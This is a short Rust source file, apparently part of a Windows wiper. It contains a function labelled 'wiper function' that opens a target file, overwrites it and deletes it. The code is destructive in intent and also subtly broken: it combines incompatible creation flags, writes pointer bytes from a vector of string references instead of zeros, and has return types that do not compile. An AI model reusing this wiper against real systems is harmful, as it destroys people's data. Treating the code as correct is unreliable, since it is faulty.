use winapi::um::fileapi::{CreateFileA,WriteFile,DeleteFileA,CREATE_ALWAYS,OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle,INVALID_HANDLE_VALUE};
use winapi::um::winnt::{GENERIC_READ,GENERIC_WRITE,FILE_SHARE_READ,FILE_SHARE_WRITE,FILE_ATTRIBUTE_HIDDEN,FILE_ATTRIBUTE_READONLY};

//wiper function
pub fn wipe(filepath:String,size:u32)
{    
    let lpfilename= std::ffi::CString::new(filepath).unwrap();
unsafe
{
     let hfile =    CreateFileA(lpfilename.as_ptr(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, std::ptr::null_mut(), CREATE_ALWAYS|OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY, std::ptr::null_mut());

    //err : 0xffffffffffffffff"
    if hfile != INVALID_HANDLE_VALUE
    {
        let mut lpbuffer:Vec<&str> = Vec::new();    
        for _i in 0..size
        {
            lpbuffer.push("0");
        }
    
    
        let _writing = WriteFile(hfile, lpbuffer.as_ptr() as *const _, size, std::ptr::null_mut(), std::ptr::null_mut());
        
        CloseHandle(hfile);
    
          
          DeleteFileA(lpfilename.as_ptr())
    }
    else 
    {
        0
    }
};
   
}

